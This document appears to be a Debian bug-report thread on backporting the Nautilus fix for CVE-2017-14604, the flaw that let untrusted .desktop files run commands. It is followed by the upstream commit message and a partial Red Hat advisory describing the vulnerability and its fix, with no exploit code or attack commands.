I have created a backport patch targeting Nautilus 3.22.3 which contains
the cherry-picked translations for the new UI string.

It adds a line to the debian/control file to remove the pre-built .mo
translation files which were included in the upstream source release. I
also needed to add gettext as a build dependency. With this patch the
.mo/.gmo files should be rebuilt with the new strings during the Debian
package build.

I have tested the backported Nautlius package with Tails 3.1 which is
based on Debian stable. The English and localised interface is displayed
correctly.

Ideally this backport would be ready for Tails 3.2 which is schedule to
be released early next week.

Please let me know if I need to make any further changes.

Regards,
Donncha

Hi,

Sorry, been busy, so not had chance to get back to this.

Tested on English, German and French and all Ok.

Attached is updated debdiff, adding credit.

Hi,

Now that the CVE ([CVE-2017-14604](https://security-tracker.debian.org/tracker/CVE-2017-14604)) has been issued and this would (well, if it
ever does) pass into debian as a security update. I have updated the debdiff
accordingly. See attached.

Link to CVE: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14604>

If any tweaks need to be made. Please let me know via this bug report.

If anyone has issues running with this patch applied. Please be sure to add
information to this bug report.

Regards

Phil

Oops... Massive sleep derived error. debdiff has been forwarded to security team
on another email that did not have a massive recipient list and had them on it.

Apologies for the error.

Hi Phil,

the debdiff looks good, but please use +deb9u1 as suffix for the version
number. You may then proceed with the upload to security-master.

Note that since it's the first nautilus security upload to stretch it needs to
be build with -sa.

You can safely upload a source-only upload, but you need to remove the
.buildinfo from the changes file before uploading.

Regards,

I'll take care of the upload. Do you intend to backport the patches to Jessie?

Hi,

I will look at it. But, I just know it will be a nightmare if possible at all. I
shall add info to the bug report probably mod next week.

Hi all,

I have looked at both 'jessie' and 'wheezy'. Both are not affected by this
specific issue and have mechanism(s) like stretch (with update) and newer
versions of nautilus that display and require input when confronted with certain
file types.

Screenshot attached showing how 'jessie' and 'wheezy' react to the example
attack desktop file.

If someone else wished to validate this, please feel free.

Regards

Phil

nautilus 3.22 introduced integrated (almost silent) tarball
decompression support which makes the test case for this vulnerability
a lot simpler.

Thanks,

mime-actions: use file metadata for trusting desktop files

```
Currently we only trust desktop files that have the executable bit
set, and don't replace the displayed icon or the displayed name until
it's trusted, which prevents for running random programs by a malicious
desktop file.

However, the executable permission is preserved if the desktop file
comes from a compressed file.

To prevent this, add a metadata::trusted metadata to the file once the
user acknowledges the file as trusted. This adds metadata to the file,
which cannot be added unless it has access to the computer.

Also remove the SHEBANG "trusted" content we were putting inside the
desktop file, since that doesn't add more security since it can come
with the file itself.

## Synopsis

Moderate: nautilus security update

## Type/Severity

Security Advisory: Moderate

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A0223)

## Topic

An update for nautilus is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Moderate. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Nautilus is the file manager and graphical shell for the GNOME desktop.

Security Fix(es):

* An untrusted .desktop file with executable permission set could choose its displayed name and icon, and execute commands without warning when opened by the user. An attacker could use this flaw to trick a user into opening a .desktop file disguised as a document, such as a PDF, and execute arbitrary commands. (CVE-2017-14604)

Note: This update will change the behavior of Nautilus. Nautilus will now prompt the user for confirmation when executing an untrusted .desktop file for the first time, and then add it to the trusted file list. Desktop files stored in the system directory, as specified by the XDG\_DATA\_DIRS environment variable, are always considered trusted and executed without prompt.

## Solution
